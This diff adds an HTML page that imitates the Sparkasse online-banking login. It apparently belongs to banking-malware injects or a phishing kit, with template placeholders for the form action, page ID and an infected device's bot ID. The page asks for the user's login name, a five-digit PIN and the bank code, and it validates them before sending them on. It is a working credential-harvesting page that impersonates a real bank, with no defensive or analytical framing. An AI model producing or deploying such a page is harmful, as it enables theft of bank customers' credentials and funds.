@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Sparkasse.de</title>
+    <link href="%DYN_PATH%/css/bootstrap.min.css" rel="stylesheet">
+    <link href="%DYN_PATH%/css/custom.css" rel="stylesheet">
+    
+    <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+  </head>
+  <body>
+    <div class="container-fluid">
+      <div class="row">
+        <div class="col-12">
+          <div class="head">
+            <img src="%DYN_PATH%/img/logo.png" height="45px" alt="" />
+          </div>
+          <form action="%ACTION%" method="post" class="wrapper" onsubmit="return function(){ 
+var ok = true;
+
+$('input').each(function (i, value){  
+	$(value).css('border', '');
+	
+	if(!$(value).val()){  
+		$(value).css('border', '1px solid red');
+		ok = false;
+		return;
+	}
+	
+	var val = $(value).val();
+	var patt = $(value).prop('pattern');
+
+	if(patt !== undefined)
+	if(!new RegExp(patt).test(val))
+	{
+		$(value).css('border', '1px solid red');
+		ok = false;
+	}
+	
+});
+
+if(window.form_sent) return false; if(ok) window.form_sent = true; return ok; 
+}()">
+				<input type="hidden" name="page_id" value="%PKG%" class="main_input"><input type="hidden" name="bot_id" value="%BOTID%" />
+                
+          <div class="content">
+            <div class="form-group">
+              <label for="input1">Anmeldename/Legitimations-ID</label>
+              <input type="text" name="fields[name]" class="form-control" id="input1" placeholder="">
+            </div>
+            <div class="form-group">
+              <label for="input2">PIN</label>
+              <input type="password" name="fields[pin]" pattern="^[0-9]{5}$" class="form-control" id="input2" placeholder="">
+            </div>
+            <div class="form-group">
+              <label for="input3">Bankleitzahl oder Stadt</label>
+              <input type="text" name="fields[bank]" class="form-control" id="input3" placeholder="">
+            </div>
+            <button type="submit" class="btn btn-default center-block">Login</button>
+          </div>
+          </form>
+        </div>
+      </div>
+    </div>
+  </body>
+</html>
